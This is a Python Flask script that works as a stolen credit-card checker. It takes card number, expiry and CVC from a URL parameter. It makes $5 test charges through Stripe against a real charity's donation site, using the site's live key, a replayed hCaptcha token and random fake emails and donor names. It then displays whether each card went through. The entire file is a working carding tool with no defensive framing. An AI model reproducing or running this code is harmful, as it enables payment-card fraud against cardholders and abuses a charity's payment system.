import requests
import random
import string
from flask import Flask, request
from colorama import init, Fore

# Initialize colorama for console logs
init(autoreset=True)

app = Flask(__name__)

def generate_random_email():
    letters = string.ascii_lowercase + string.digits
    return ''.join(random.choice(letters) for i in range(10)) + "@gmail.com"

@app.route('/')
def stripe_api():
    cc_param = request.args.get('cc')
    
    if not cc_param:
        return "API is working @usernamexdz"

    try:
        # Split CC details: 5509890034877216|06|2028|333
        cc_parts = cc_param.split('|')
        cc_num, cc_mon, cc_year, cc_cvc = cc_parts[0], cc_parts[1], cc_parts[2], cc_parts[3]
    except Exception:
        return '<body style="background-color:black; color:red;">Invalid CC Format. Use: num|mm|yyyy|cvc</body>'

    random_email = generate_random_email()

    # --- INITIALIZE STRIPE HEADERS ---
    headers_stripe = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }

    # --- STEP: INTERNAL SESSION (Hidden) ---
    requests.get(
        'https://api.stripe.com/v1/elements/sessions?deferred_intent[mode]=payment&deferred_intent[amount]=546&deferred_intent[currency]=usd&key=pk_live_51L4ky7Edrj17I3QntDnGPrHStIlOtvZtaUdQIg6LGU3aFRzIB0Z0BQnJ0w6znCaB4exwzvG7rcHkpVRUZBJgcwXJ00o7frMvbS&elements_init_source=stripe.elements&referrer_host=donate.22qfamilyfoundation.org&session_id=elements_session_1mzVciWsrs3&stripe_js_id=7b21ac69-5484-4a33-ab63-b447a6f78025&top_level_referrer_host=22qfamily.org&locale=en-GB&type=deferred_intent',
        headers=headers_stripe,
    )

    # --- 1. PAYMENT METHOD CREATION ---
    data2 = f'billing_details[name]=Bikash+Shah&billing_details[email]={random_email}&billing_details[address][country]=NP&type=card&card[number]={cc_num}&card[cvc]={cc_cvc}&card[exp_year]={cc_year}&card[exp_month]={cc_mon}&allow_redisplay=unspecified&payment_user_agent=stripe.js%2Fbadb92382f%3B+stripe-js-v3%2Fbadb92382f%3B+payment-element%3B+deferred-intent%3B+autopm&referrer=https%3A%2F%2Fdonate.22qfamilyfoundation.org&key=pk_live_51L4ky7Edrj17I3QntDnGPrHStIlOtvZtaUdQIg6LGU3aFRzIB0Z0BQnJ0w6znCaB4exwzvG7rcHkpVRUZBJgcwXJ00o7frMvbS&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzcxNjg1Mzc4LCJjZGF0YSI6IkdBSXArRVE5RHBsMGpySjljMnVDVVQzbWcxR1g2S3Vkb21yV3R6ZG90eW9sWldhbDBhL3NpWEhQSXBETUVhMG9Kamdzd2ZYdUR1bHBkOG1jejZIdEdFK1RYRnF6ZituQ2xZNCtvaWhScm5DZHg1VkFXdm5UKzFZa3hBRUJJaWRlNjJkN1Nubng3YTZ4WW1IQTB2RjZQdWlXeGp5ZlI0SkF3b2tKd21yTzZsSUJOZnRwUmFzckJMNWlPUXo3eTJLMFdBQ01QOThmck5DaHlBT3dmYzVhQnBPWVIyZTJDZnM1NXpPWEZlbzI2blJjOWY2RkJ5a3pHLzFhN3FhQ2dGMFZrZ1dVWlhaS1ZoQURPbnVSYkhqdmpRVHVHSUFFa0ZHYUV3ZXhtSW52UCtySW1uWVl6TGFxdWYzQXN6MHlBb1BGVHByMFJEc3A3WkVJNXFwUVloTGhjUlZMUWpwb25FR2VDS2w1U0NLRHUrQT1LUFlwNllOK1FNeVhsVHU4IiwicGFzc2tleSI6ImIraWl5alZTSENrTGUxVldCbXUxTDdwTUk2TmF2M2RPQW5Td0Z0eTlYaVlNb012MUEvaGVDYWk4OHRrSzBRWm1mbnppZ0U4eW43ZDl3cE94MVpGbHpDZ3IwRkJIMkkwWm9QY3RFZFkyYjcrMnRhYTRsMEorclpqdHNicy9OcnBxdk1qM0hwNmZib1M5YVkrSFM1VEpPZHlKdXFwTXM2K2MxYlg0Y1VkcVg4VUlMcXBCWG9ocmU3UjFRVmVOU1U4MCsyV1JqWmU4bTRZTUgrNUJlN1pTSGpMVjgzYlNMY2xyN1BOZnRwTkg5VHU4WTAyNzJUaUFJZWRKNG5lbkJocE90NEpOZEdUYXJYcmh6NEZkT0Zub244M3hkdEtVVXJJRTBSSnQ5QkQ1ZUFxSFRBNVEzTGordlFDelZyaTVaMVJubjN6NnhQVTZsUmhWRG85WVAvYmc3YmJ5NFhwZE9HWWtzb3V4MkwwMkRKWnV5Y1NDZFlJRkxMWjdoY0F3Ykd5K012S3drNWxycWE3MFZkazY0alBXSzUwNTJ1NDJQR3k2ellsUHljNFJTTTNCWFR5L09BWlFoWHdXQmdMTkZPcFowK2NSV2VqWE43Y1c4dDk3K3k5d0lKUE8xbVJCeHd6c2p6VU9DZG5LUTkycTNTenFhM3NhWjhNZVZkbXRKYjdvQlk4UHRDM2dXNXZKczFYTHF1NGY3VWF4cndJWjhRckFaYW5RZG1VWHlkanJWUXdORk5qcjRJcWFoZ2VPUVhMd0dVUEFBbTg3eWJLV0h6TDIrMW9yYktFVHlHNEc2clNYVkVyc2U1T2pGR3IyYXFMR21tVGZSMFEzUUkxakJVUjZMUG5SREtRVExWNnRMU3FDR0NOY0R0UFNibHUrbDZNVjdyQ1I5Q0t6Wi9hMFVPc2dKYUNQbEcwWnRRejFNU1JlNlBJMEZDeWRENUVoSVhLUXpyZ3ZNZ09GcDhYY2FEZlkyOEo2NXVoWlJiRWgrL1grQmYyZVBTa3hWU3kwNFE5YXZBMXhWYkpIYmJZQ2NwVXZJK1Bld1NObll6cTAzSHUvQlI4UTNUaUFNMkhaOG9nc3hHNVE2ekN0NytiTHljbE1tSWJka245RDJ0dzFnNkRTVk1HcjZPc21CYnhXdVhsWWNzdk4rS3ZoT1U3YU8zRlQxR1V6ZncyVUpVekcxZy9WRFlYZ2cwQ3Mwbm50YkVEWncxU2szUVBQaFZlNG1vSWRUcU0yZm1tSk9IeklaeXZxVklVMWM0LytVR2V1UUhyVWdTZlByZmJvUUY0VDNLQVhHeU1rQlFIbjR2amR5ZGlFSFIzaXZwYy8wZjdiZ2VEVXVxaDV3dTJxVVJnZUJFeHpEVFUzaS9LQWhGN0oxWVJoMU1YelM2S3BaaGU5YjJ4VGM4YjVVNVZ2WkNDcFdvdFhpZ2h5TmtCOWVadi9VUWJiZlBsY1VzUE1TRy9hYmRtdUpRdzFQMVo2dGx1NndydTNTaDlCdzE4cVk4Z3dxcFF3QWlCOWtmZVkxOEFDNEI2bW5OZVZQTHNTTG1vc0c2WmdVOGFmdUJxalN3V2NLSXlva3Ntby95ZXlIeFNuNE1DbEZ3ZXlLSmxVWDAzS2NyL0ZlaFg2V1hDNCt0Tm1zcjZ1OEJ5YThpU2R1ZnNJWkFSZHo3MzhPaU9JaG5SMmZEalJ4eWdDbTFsVVV1SS9lL3A0eDRkTkJjbU90MTU3SFdiMkxIajBlL3FWanpwMHBvOGIvbDJUM0kyUVIyR20yR3U2NitLRnBHcnkwTmxlSDFPOEJzSy9manZGbnRkNHpDb09BTXRDbXE5NTBVd1A1UkZsU0p5YnZ3aHd6RndZU2wwekRwbzFadVc5dk1zZXd6OGFzRVdra1ZNTUc4OWhSNUorMGJtZGkxczJmaHlUR3Vldy96cnRobEZuQjlRcEtTREt2eUsvbUZmYkRVVEpKK2VJaUsyQXY1NWJnR0htUmF4UXZXVUtONTQ4emx1QWc3cC9tOWJmVTdpbGwzbWNPaUNhZ0dEdEVrQ2FqMVRTaGFQUW13YWt5clR1SnBXK2lDMWFUZHBFN29WZmFJRVY0eVpwYitQcE9BeTRHQWp6cnR3dXVRYUdsbFNDMTRSR1VGdjNPM0k1elBCVVZpNi9pVHdEWnlmRWRRTWYvK2tuY3hORitxU0VWbnorREVUVXM0UWxySHpDZlR1THduQThvUGtkV1BUTTU3YlgyRUZMZzVKdUZyNlRsTHczTWdUZnNjRHAyY2hCc25Yc3ZiS2hTUUtHM2krVWJQSEJMQWtpbWZjbHY2azlYM0Jmb0x0ZVpCSmFMSkU4ZE04Sm9LdnVNRHdZaXFISWp3eWlBODNqdU1uS09ZcnExVHRHQVpUd2pGdnErRXFZL2JZME5nUXdUelh4dnRCREZTd0lwMmRHaXRxNWh4SlRHK1RCU3h0bnBIVVpjeEk5MlBqU0F6T0IxRFZsU3IyZlZkRm9mL3ROVWRqVDBIWkN4RTNHU1FCSUtaTUd5VDFXN0lJWjMrbGxmMmlxZytBeDZmNHRrTElzUHJQQmJkUUNvWUNSc3FmdVdFNS83VE9hZm1aUFIzQk1IVDkzaXQydzdqbXpuZkcwdWVqZlhxN0NqT01MODk4WFR3cz0iLCJrciI6IjQzMTYzNjBiIiwic2hhcmRfaWQiOjM2MjQwNjk5Nn0.-ix0q1DdutndS27idZo9jBPHmgxxnGdqx9uekTk4Mc8'

    r2 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers_stripe, data=data2)
    resp_pm = r2.text
    pm_id = r2.json().get('id')

    # --- STEP: MERCHANT INTENT (Hidden) ---
    headers_merchant = {
        'authority': 'donate.22qfamilyfoundation.org',
        'accept': 'application/json',
        'content-type': 'application/json',
        'origin': 'https://donate.22qfamilyfoundation.org',
        'referer': 'https://donate.22qfamilyfoundation.org/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }

    json_data3 = {
        'amount': 500, 'baseAmount': 500, 'processingFee': 0, 'totalAmount': 500,
        'coverFees': False, 'firstName': 'Bikash', 'lastName': 'Shah',
        'email': random_email, 'frequency': 'oneTime',
        'metadata': {
            'frequency': 'oneTime', 'coversFees': 'false', 'baseAmount': '5.00',
            'processingFee': '0.00', 'totalAmount': '5.00',
            'donorFirstName': 'Bikash', 'donorLastName': 'Shah',
        },
        'paymentMethodId': pm_id,
    }

    r3 = requests.post('https://donate.22qfamilyfoundation.org/api/create-payment-intent', headers=headers_merchant, json=json_data3)
    client_secret = r3.json().get('clientSecret') or r3.json().get('client_secret')
    
    resp_confirm = "Error: Intent Creation Failed"
    if client_secret:
        pi_id = client_secret.split('_secret_')[0]
        # --- 2. FINAL CONFIRMATION ---
        data4 = f'use_stripe_sdk=true&mandate_data[customer_acceptance][type]=online&mandate_data[customer_acceptance][online][infer_from_client]=true&return_url=https%3A%2F%2Fdonate.22qfamilyfoundation.org%2Fdonation-success.html&key=pk_live_51L4ky7Edrj17I3QntDnGPrHStIlOtvZtaUdQIg6LGU3aFRzIB0Z0BQnJ0w6znCaB4exwzvG7rcHkpVRUZBJgcwXJ00o7frMvbS&client_secret={client_secret}'
        
        r4 = requests.post(f'https://api.stripe.com/v1/payment_intents/{pi_id}/confirm', headers=headers_stripe, data=data4)
        resp_confirm = r4.text

    # --- RENDER ONLY 1 AND 2 ---
    html_out = f"""
    <body style="background-color: #0d0d0d; color: #00ff00; font-family: monospace; padding: 30px; line-height: 1.6;">
        <h2 style="color: white; border-bottom: 2px solid #00ff00; display: inline-block;">Transaction Result: {cc_num}</h2>
        
        <div style="margin-top: 20px;">
            <b style="font-size: 1.2em;">1. Payment Method Creation</b>
            <pre style="background: #1a1a1a; padding: 15px; border-left: 5px solid #00ff00; overflow-x: auto; margin-bottom: 30px;">{resp_pm}</pre>
        </div>

        <div>
            <b style="font-size: 1.2em;">2. Final Confirmation</b>
            <pre style="background: #1a1a1a; padding: 15px; border-left: 5px solid #00ff00; overflow-x: auto;">{resp_confirm}</pre>
        </div>
    </body>
    """
    
    print(Fore.GREEN + f"Flow completed for {cc_num}")
    return html_out

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=6969)

